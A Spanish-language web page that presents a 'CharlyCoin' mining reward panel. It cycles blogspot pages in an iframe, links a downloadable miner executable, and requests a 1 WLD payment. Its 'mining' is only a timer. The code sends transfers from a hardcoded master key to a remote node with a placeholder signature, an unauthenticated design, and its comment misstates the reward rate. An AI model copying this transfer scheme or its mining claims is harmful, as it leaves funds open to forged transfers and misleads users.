<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Promociona tu Proyecto | CharlyScan</title>
  <style>
    body { text-align: center; padding: 20px; font-family: Arial, sans-serif; background: #0a0a0a; color: white; }
    .card-panel { background: #161616; padding: 20px; border-radius: 15px; border: 1px solid #333; margin-bottom: 20px; }
    #iframeContainer { width: 100%; height: 450px; border: 2px solid var(--gold); margin-top: 20px; border-radius: 10px; overflow: hidden; }
    iframe { width: 100%; height: 100%; border: none; }
    
    input { margin: 10px; padding: 12px; width: 80%; border-radius: 5px; border: 1px solid #444; background: #000; color: #2ecc71; font-family: monospace; }
    button { margin: 10px; padding: 12px; width: 85%; border-radius: 25px; border: none; cursor: pointer; font-weight: bold; background: #f1c40f; color: black; transition: 0.3s; }
    button:hover { background: #d4af37; }
    
    .chc-counter { font-size: 1.5em; color: #f1c40f; margin: 15px 0; font-weight: bold; }
    .nota-red { color: #e74c3c; font-weight: bold; font-size: 0.8em; }
    .wallet-link { color: #3498db; text-decoration: none; font-size: 0.8em; display: block; margin-bottom: 10px; }
  </style>
</head>
<body>

<div class="card-panel">
    <h2>Promociona tu Proyecto</h2>
    <p class="nota-red">Costo: 1 WLD | Destino: 0xdc178d65c502f9589bb1a35af08b5723f85ec168</p>
    
    <!-- CONEXIÓN DE BILLETERA -->
    <input type="text" id="userWallet" placeholder="Pega tu Billetera CharlyMiner aquí..." onkeypress="handleKeyPress(event)" />
    <a href="https://github.com/ganastrx4/binance-bot/releases/download/v1.0/charlycoin_miner.exe" class="wallet-link">
        ¿No tienes billetera? Baja el minero (Opción 3)
    </a>

    <div class="chc-counter">💰 Ganancia: <span id="chcCount">0</span> CHC</div>
    <div id="minerStatus" style="font-size: 0.8em; color: #888;">Introduce tu billetera para empezar a ganar</div>
</div>

<div id="iframeContainer">
  <iframe id="iframeRedireccion" src=""></iframe>
</div>

<div style="margin-bottom: 100px;">
    <button onclick="continuarMineria()">REANUDAR MINERÍA</button>
    <button style="background:#e74c3c; color:white;" onclick="pararMineria()">DETENER Y GUARDAR</button>
</div>

<script>
  let segundos = 0;
  let chcGanados = 0;
  let interval;
  let minando = false;
  
  const NODO_URL = "https://binance-bot-hna7.onrender.com";
  const MASTER_PUBLIC = "93aab2b2ee274042d81954cd6569085ac3f1f660d600e6c7ca3aa11adbf94e62544ff783541316f3c7269d751079414e879f18804dde24c1b83c70c4e13cd4ee";

  const urls = [
    "https://tareasunamyunadm.blogspot.com",
    "https://faucentminialtcrypto.blogspot.com",
    "https://solotareasmex.blogspot.com",
    "https://juegospcmexico.blogspot.com"
  ];

  function redireccionAleatoria() {
    document.getElementById('iframeRedireccion').src = urls[Math.floor(Math.random() * urls.length)];
    setTimeout(redireccionAleatoria, 20000);
  }
  redireccionAleatoria();

  // Activa el proceso al dar Enter en la caja
  function handleKeyPress(e) {
    if (e.keyCode === 13) {
      continuarMineria();
    }
  }

  function contarTiempo() {
    const wallet = document.getElementById('userWallet').value.trim();
    
    if (minando && !document.hidden && wallet.length > 10) {
      segundos++;
      
      // Lógica de crecimiento de CHC: 1 CHC cada 100 segundos
      if (segundos % 2 === 0) {
        chcGanados++;
        document.getElementById('chcCount').innerText = chcGanados;
        enviarAlNodo(wallet, 1); // Envía directo al nodo
      }
      
      document.getElementById('minerStatus').innerText = `Minando para: ${wallet.substring(0,10)}... (${segundos}s)`;
    } else if (wallet.length <= 10) {
      document.getElementById('minerStatus').innerText = "⚠️ Error: Pega una billetera válida";
    }
  }

  async function enviarAlNodo(receptor, monto) {
    try {
      await fetch(`${NODO_URL}/transferir`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          emisor: MASTER_PUBLIC,
          receptor: receptor,
          monto: monto,
          firma: "WEB_MINING_REWARD"
        })
      });
    } catch (e) { console.log("Nodo ocupado..."); }
  }

  function continuarMineria() {
    const wallet = document.getElementById('userWallet').value.trim();
    if (wallet.length < 10) return alert("Primero pega tu billetera de CharlyMiner.");
    
    if (!minando) {
      minando = true;
      if (!interval) interval = setInterval(contarTiempo, 1000);
      alert("Minería vinculada a tu billetera.");
    }
  }

  function pararMineria() {
    minando = false;
    alert(`Sesión terminada. Total enviado: ${chcGanados} CHC`);
  }
</script>

</body>
